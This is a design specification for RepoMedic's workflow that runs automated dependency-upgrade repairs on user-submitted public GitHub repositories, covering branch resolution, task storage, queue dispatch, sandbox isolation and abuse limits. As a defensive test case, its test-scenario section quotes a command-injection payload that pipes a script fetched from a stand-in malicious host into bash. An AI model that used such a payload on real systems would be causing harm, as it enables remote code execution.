# 0010 · public repository workflow

**Date**: 2026-10-29
**Status**: Proposed

## Summary

This specification defines the complete technical workflow allowing users to paste any public GitHub repository URL, pick a Git branch, configure a Python dependency upgrade, and execute an automated repair through RepoMedic. It designs server side branch resolution to immutable commit hashes, dynamic task recipe persistence in Turso, and execution through the existing Amazon SQS worker. It establishes the mandatory sandbox isolation boundaries and abuse controls required before arbitrary code execution can safely open to the public internet.

## Context

In spec 0009, RepoMedic shipped a safe product slice that allows users to configure and validate custom repository parameters through client and server schemas, while keeping actual execution gated off. Curated demo repositories currently prove the engine, provider adapters, Turso storage, and web dashboard across multiple real scenarios like SQLAlchemy, Pydantic, and Click.

The remaining product goal is allowing a judge or open source developer to input their own public Python repository, pick a branch, and observe a real repair. However, executing arbitrary code submitted over the internet introduces severe operational risks. If an untrusted repository contains malicious code in its setup scripts or test suites, it could execute unauthorized commands, call internal metadata endpoints, exfiltrate credentials, or run cryptocurrency miners that drain the cloud budget.

Before removing the execution gate, RepoMedic must resolve branches to immutable commits without downloading full repositories, persist user defined task recipes safely, enforce airtight microcontainer isolation, prevent public endpoint abuse, and present truthful status in the web interface.

## Requirements

**User stories**:
- As an open source maintainer, I want to paste my public GitHub repository URL and select my main branch so that I do not have to look up a 40 character hexadecimal commit hash manually.
- As a user, I want to configure a target Python dependency version, test commands, and allowed source paths so that RepoMedic attempts a repair tailored to my project.
- As a platform operator, I want untrusted repositories to run inside isolated microcontainers without access to cloud credentials or external networks so that the platform remains secure and budgeted.

**Acceptance criteria**:
- **AC-1**: Remote branch resolution: Given a valid public GitHub HTTPS repository URL, the server queries remote branches using `git ls-remote` within 5 seconds and returns branch names with their current 40 character commit hashes without cloning the repository.
- **AC-2**: Inaccessible repository handling: When a repository URL is private, nonexistent, or throttled by GitHub, the system returns a descriptive error message without exposing server internals or failing silently.
- **AC-3**: Immutable commit pinning: When a user selects a branch, the system pins the execution to the exact commit SHA returned during resolution, ensuring the task recipe is completely immutable and reproducible.
- **AC-4**: Custom task persistence: When a valid custom configuration is submitted, the server generates a unique task identifier (`TASK-CUSTOM-<uuid>`), serializes the configuration as a valid `TaskRecipe` JSON blob, and saves it in the Turso `tasks` table.
- **AC-5**: Production worker dispatch: The server creates a run record referencing the custom task and enqueues the run ID to the existing Amazon SQS queue, allowing the existing AWS Lambda worker to process it without altering queue contracts.
- **AC-6**: Container isolation and secret scrubbing: During repair and verification, the sandbox container runs without cloud provider credentials, without access to cloud instance metadata services, and with strict process timeouts.
- **AC-7**: Abuse prevention and budget protection: The public submission endpoint enforces IP rate limiting (maximum 3 resolution requests per minute, maximum 1 active run per client session) and rejects submissions when the remaining global budget cannot cover the maximum run cap ($0.50).
- **AC-8**: Transparent UI state machine: The web interface guides the user through URL entry, branch loading, dependency configuration, preflight validation, active pipeline tracking, and artifact downloads with truthful progress labels.

## Options considered

### Option 1: Client side branch resolution with direct execution ungate

The browser queries the GitHub REST API directly to fetch branches and passes the selected commit SHA to the existing `POST /api/runs` endpoint. The server gate is removed.

**Pros**:
- Fastest to write because it avoids adding new backend endpoints.
- Leverages GitHub public REST API directly from the client browser.

**Cons**:
- GitHub public REST API has an unauthenticated IP rate limit of only 60 requests per hour shared across users on the same gateway or NAT.
- Leaves the backend vulnerable to arbitrary task payload injection without server side reachability checks.
- Bypasses server controls over branch to commit mapping.

### Option 2: Server side branch resolution with preflight validation and isolated container execution (Chosen)

The backend provides a dedicated endpoint `POST /api/custom/resolve-branches` using `git ls-remote`. The server validates reachability, resolves branches to immutable commit SHAs, validates task bounds, persists the task recipe in Turso, and dispatches to SQS. The worker executes inside an isolated ConTree microcontainer with stripped credentials and strict timeout guards.

**Pros**:
- Does not depend on GitHub REST API token quotas; `git ls-remote` is extremely fast and lightweight.
- Server guarantees that the commit SHA truly belongs to the target public repository before enqueuing work.
- Reuses the existing Turso `tasks` table and production SQS worker pipeline without breaking changes.
- Centralizes rate limiting, budget reservation, and security enforcement on the backend.

**Cons**:
- Requires implementing the branch resolution endpoint and integrating it into the frontend form.
- Requires adding rate limiting and per session tracking to protect the public cloud budget.

### Option 3: Full arbitrary repository runner with user GitHub OAuth and Bring Your Own Cloud credentials

Require users to sign in with GitHub, grant repository access, and provide their own Nebius or OpenAI API keys to fund runs.

**Pros**:
- Eliminates operator budget risk because users pay for their own model tokens and sandboxes.
- Enables private repository repairs and automatic pull request creation.

**Cons**:
- High user friction; judges and demo reviewers cannot test the application without creating accounts and providing cloud credentials.
- Far exceeds the scope and remaining time for the October 30 milestone.

## Decision

**Chosen option**: Option 2: Server side branch resolution with preflight validation and isolated container execution.

RepoMedic will implement server side branch resolution using `git ls-remote`, persist custom task recipes into Turso libSQL storage, dispatch runs through the existing Amazon SQS queue, and enforce sandbox isolation guards.

## Feature design

### Data model additions

The existing `tasks` table schema already supports arbitrary task recipes through its `recipe_json` column:
```sql
CREATE TABLE IF NOT EXISTS tasks (
  task_id TEXT PRIMARY KEY,
  title TEXT NOT NULL,
  repository_url TEXT NOT NULL,
  commit_sha TEXT NOT NULL,
  dependency TEXT NOT NULL,
  from_version TEXT NOT NULL,
  to_version TEXT NOT NULL,
  recipe_json TEXT,
  created_at TEXT NOT NULL
);
```

For custom tasks:
- `task_id`: Generated as `TASK-CUSTOM-<uuid8>` (for example `TASK-CUSTOM-4a8b1c2d`).
- `title`: Formatted as `Custom: Upgrade <dependency> <from_version> to <to_version> in <repo_name>`.
- `recipe_json`: Serialized JSON object matching the full `TaskRecipe` contract (including `test_command`, `allowed_source_paths`, `expected_failure`, `timeout_seconds`, `max_candidates`, and `max_refinements`).

A new in memory or SQLite rate limiting table `client_rate_limits` tracks submission velocity:
```sql
CREATE TABLE IF NOT EXISTS client_rate_limits (
  client_ip TEXT NOT NULL,
  action TEXT NOT NULL,
  window_start INTEGER NOT NULL,
  request_count INTEGER NOT NULL,
  PRIMARY KEY (client_ip, action)
);
```

### State transitions

1. `Unconfigured`: Form is empty or user is entering a repository URL.
2. `Resolving Branches`: Client calls `POST /api/custom/resolve-branches`. UI shows a loading spinner on the branch dropdown.
3. `Branch Resolved`: Branches are loaded into the select menu. The default branch (main or master) is preselected, and its pinned commit SHA is stored in component state.
4. `Validating`: User submits the configuration. Client calls `POST /api/custom/validate`. Both client and server verify syntax, paths, and pytest arguments.
5. `Validated & Ready`: Configuration passes all contract checks. Pinned commit SHA, versions, allowlist, and expected failure are confirmed.
6. `Enqueued`: Client calls `POST /api/custom/run`. Server generates task record, reserves budget, creates run in Turso, enqueues run ID to SQS, and returns HTTP 202 with `run_id`.
7. `Executing`: AWS Lambda worker claims the run from SQS, creates the ConTree microcontainer, runs baseline checks, upgrades the dependency, generates candidates via Nemotron, and verifies the patch.
8. `Terminal Result`: Run transitions to `succeeded` or `failed`. Results card renders the change manifest and artifact download buttons.

### API surface

| Endpoint | Method | Key inputs | Key outputs | Auth | Key errors |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `/api/custom/resolve-branches` | POST | `repository_url: string` | `default_branch: string`, `branches: [{name, commit_sha}]` | Public (rate limited) | 400 (invalid URL), 404 (repo not found or private), 429 (rate limit) |
| `/api/custom/validate` | POST | `CustomRepositoryConfig` | `valid: bool`, `errors: string[]`, `field_errors: dict` | Public (rate limited) | 422 (malformed payload), 429 (rate limit) |
| `/api/custom/run` | POST | `CustomRunRequest` (config + search_mode + idempotency_key) | `RunSummary` | Public (rate limited + budget guarded) | 400 (invalid config), 409 (budget unavailable or active run exists), 429 (rate limit) |

### Value sourcing

| Action | Value produced or displayed | Source |
| :--- | :--- | :--- |
| Branch resolution | List of branches and commit SHAs | Remote Git references via `git ls-remote` |
| Branch resolution | Default branch selection | `HEAD` symref from `git ls-remote --symref` |
| Form validation | Field errors and safety messages | Local validation logic and `POST /api/custom/validate` response |
| Task creation | `task_id` | Server generated `TASK-CUSTOM-<uuid8>` |
| Task creation | `recipe_json` | Validated user inputs serialized as `TaskRecipe` |
| Run creation | `run_id` | Server generated `run_<uuid32>` |
| Run creation | Initial budget reservation | Server setting `repomedic_max_run_usd` ($0.50 cap) |
| Worker execution | Pinned commit checkout | `recipe.commit_sha` stored in task record |
| Results presentation | Verification metrics and diff | Verified container execution output stored in Turso |

### Key invariants

1. **Commit immutability**: Once a branch is resolved to a commit SHA, all subsequent execution is strictly pinned to that SHA. No floating branch references are ever passed to the sandbox worker.
2. **Read only test files**: The mutation allowlist strictly excludes test directories (`tests/`, `test/`) and configuration files (`pyproject.toml`, `setup.cfg`). Patch validation rejects any candidate modifying unapproved paths.
3. **No host credentials in microcontainer**: The sandbox microcontainer environment is launched without cloud API keys, Turso tokens, or AWS IAM role credentials.
4. **Hard spending ceiling**: Every custom run requires an atomic budget reservation ($0.50) before SQS enqueueing. If `committed_usd + 0.50 > total_budget_usd`, creation is rejected with HTTP 409 Conflict.
5. **Single active run per task**: The database constraint `idx_active_run_per_task` prevents duplicate concurrent runs on the same repository task.

### Security and isolation model

Running untrusted repositories requires strict, enforceable boundaries across five layers:

1. **Credentials Isolation**:
   - The worker process runs in AWS Lambda. It possesses AWS execution role credentials and environment secrets (`NEBIUS_API_KEY`, `TURSO_AUTH_TOKEN`).
   - The untrusted repository code executes exclusively inside a remote ConTree microcontainer.
   - The worker must never forward its own environment dictionary to `client.images.docker(...)` or `image.run(...)`. Environment variables inside the container must be strictly restricted to safe build tools (for example `GIT_TERMINAL_PROMPT="0"`, `PYTHONUNBUFFERED="1"`, `PATH="/usr/local/bin:/usr/bin:/bin"`).

2. **Network Access Control**:
   - The ConTree microcontainer currently allows outbound network egress to allow `git clone` and `pip install`.
   - Threat: A malicious repository could use test execution to attack external servers or exfiltrate environment data.
   - Mitigation:
     - Stage 1 (Clone & Install): Outbound network is active only during repository checkout and dependency installation.
     - Stage 2 (Test & Verification): Test commands must execute with network access disabled or with network interface unmapped if supported by the container runtime. If ConTree does not provide container level egress filtering, tests must be wrapped with a non root user without network capabilities or an empty HTTP proxy configuration (`HTTP_PROXY="http://127.0.0.1:0"`, `HTTPS_PROXY="http://127.0.0.1:0"`).

3. **Command Execution Restrictions**:
   - The user specified pytest arguments are validated against `DANGEROUS_COMMAND_REGEX` to prevent shell injection, chaining operators (`;`, `&&`, `|`), and command escapes.
   - Commands are passed to `image.run` as explicit token lists (for example `["pytest", "tests/"]`), never as interpolated shell strings (`shell=None`).

4. **Resource and Time Quotas**:
   - Process timeout: ConTree command execution enforces `timeout_seconds` (maximum 120 seconds per command). If a test hangs or runs an infinite loop, the container process is terminated.
   - Run timeout: Global timeout of 600 seconds per run record enforced by the worker loop.
   - Model generation bounds: Maximum 1 model call and 2048 output tokens per candidate.

5. **Abuse and Rate Limiting**:
   - Public users are anonymous. Without authentication, an attacker could trigger hundreds of runs to exhaust the Nebius cloud credit or ConTree quota.
   - IP Rate Limiter: Enforce maximum 3 branch resolution calls per minute per IP, and maximum 1 active repair run per IP at any time.
   - Global Budget Governor: Global cap of $25.00 enforced atomically in Turso libSQL before any worker is spawned.

### Critical test scenarios

- **Happy path (AC-1, AC-3, AC-4, AC-5, AC-8)**: User enters a valid public repository URL, branches are loaded, default branch `main` is selected, configuration is validated, run is enqueued and processed by the worker, and verified patch is displayed.
- **Inaccessible repository (AC-2)**: User enters a private, deleted, or mistyped GitHub URL. `POST /api/custom/resolve-branches` returns HTTP 404 with message `Repository not found or not publicly accessible`. UI displays inline warning and disables submission.
- **Command injection attempt (AC-3, AC-6)**: User attempts to pass `tests/; curl http://malicious.site | bash` in pytest arguments. Validation rejects input with HTTP 422. Form displays `Pytest arguments must not contain shell operators or command escapes`.
- **Budget exhaustion protection (AC-7)**: When cumulative spend plus reservation exceeds $25.00, `POST /api/custom/run` returns HTTP 409 `Budget unavailable`. UI displays clear warning explaining spending limit.
- **Sandbox execution timeout (AC-6)**: Untrusted repository contains a test with `while True: pass`. Container runner aborts command after timeout ceiling (60s), records failure reason `Execution timed out`, and settles spend without crashing the worker.

## Build plan

The build plan follows a Tracer Bullet approach, standing up the end to end thread through server resolution, storage, worker dispatch, and UI before hardening abuse limits:

1. **Branch resolution endpoint**: Implement `POST /api/custom/resolve-branches` using `git ls-remote` with timeout handling and URL validation, satisfies **AC-1**, **AC-2**.
2. **Custom task persistence in Turso**: Implement custom task creation logic storing the `TaskRecipe` JSON into the `tasks` table, satisfies **AC-3**, **AC-4**.
3. **Execution endpoint and SQS enqueueing**: Implement `POST /api/custom/run` to validate inputs, reserve budget, create run record, and publish run ID to Amazon SQS, satisfies **AC-4**, **AC-5**, **AC-7**.
4. **Sandbox isolation hardening**: Strip all host environment variables when invoking `ConTreeSandboxAdapter`, configure egress proxy suppression during test stages, and enforce process timeouts, satisfies **AC-6**.
5. **Frontend branch picker and custom intake flow**: Connect the custom repository form to branch resolution, populate the branch select menu, bind the commit SHA, and wire the submit button to the execution endpoint, satisfies **AC-8**.
6. **Rate limiting and abuse protection**: Add IP based velocity limits to custom endpoints to protect against automated denial of service, satisfies **AC-7**.
7. **Acceptance suite with unregistered repository**: Write end to end integration test using a previously unregistered public repository, executing repair, and verifying the downloaded patch on a fresh checkout, satisfies **AC-1**, **AC-3**, **AC-4**, **AC-5**, **AC-6**, **AC-8**.

## Consequences

**Positive**:
- Users can test RepoMedic on real open source Python repositories without manual commit lookup.
- Pinned commit SHAs ensure completely deterministic, reproducible repairs.
- SQS and Lambda architecture remains uniform across curated demos and user repositories.

**Negative / Tradeoffs**:
- Public execution exposes cloud provider budgets to consumption by arbitrary users.
- Network egress controls in cloud microcontainers require careful configuration to allow package installation while preventing test time network abuse.
- Complex repositories with native C extensions, Docker dependencies, or database services will fail baseline tests unless base container images provide necessary system packages.

**Neutral**:
- Custom tasks are marked with `TASK-CUSTOM-` prefixes to clearly distinguish them from curated benchmark tasks in history and telemetry views.

## Migration plan

**Strategy**: Feature flagged strangler pattern.

**Phases**:
1. Phase 1: Deploy backend branch resolution endpoint and custom task storage while keeping `repomedic_custom_execution_enabled=false`.
2. Phase 2: Deploy frontend branch picker and live validation UI.
3. Phase 3: Enable execution flag `repomedic_custom_execution_enabled=true` with strict rate limits and $0.50 per run budget reservations.
4. Rollback: If abuse or container instability is detected, set `repomedic_custom_execution_enabled=false` in SSM or environment variables. All custom execution immediately falls back to the safe product slice without redeploying code.

---

## October 30 Feasibility Assessment and Blockers

### Current Status (October 29, 2026)
RepoMedic currently operates in a fully verified, safe product slice:
- Three real curated demo scenarios (SQLAlchemy, Pydantic, and Click) execute end to end in production in 9.0 seconds with full verification, AST validation, and downloadable artifacts.
- The custom repository intake form is live and validates configuration parameters, while arbitrary execution is safely gated off.
- Global budget ledger has $14.70 remaining out of the $25.00 limit.

### Work Required to Ungate Arbitrary Execution
To safely ungate public repository repair without risking security breaches or budget drainage, the following must have items are required:

1. **Must have before enabling execution**:
   - Server side branch resolution endpoint (`git ls-remote`).
   - Custom task recipe serialization and insertion into Turso.
   - SQS dispatch integration for custom task IDs.
   - Hardened microcontainer credential isolation (verifying no AWS or Nebius tokens are reachable from container processes).
   - Rate limiting and per IP execution throttling to prevent automated budget exhaustion.
   - End to end verification with an unregistered repository.

2. **Later improvements (post October 30)**:
   - Full network egress firewalling inside ConTree containers.
   - Custom system dependencies (for example `apt-get` packages for native Python wheels).
   - User authentication and GitHub OAuth app integration.
   - Automatic pull request creation on GitHub.

### Honest Timeline and Recommendation
- Estimated Engineering Effort: 8 to 12 focused hours to implement the backend resolution endpoint, custom task storage, frontend branch selector, and integration tests.
- Risk Assessment for October 30 Submission: High risk to system stability and live judge demonstrations if arbitrary repository execution is enabled without extensive security testing. If an untrusted repository crashes the shared SQS worker or consumes the remaining $14.70 budget, all judge demo evaluations will fail.
- **Architect Recommendation**: Maintain the current safe product slice with the execution gate enabled for the primary judge submission. Present the live curated demo scenarios (SQLAlchemy, Pydantic, Click) which prove 100% real LLM inference, ConTree microcontainers, Turso storage, and patch verification. Keep this specification as the approved architectural blueprint for the subsequent ungate release.
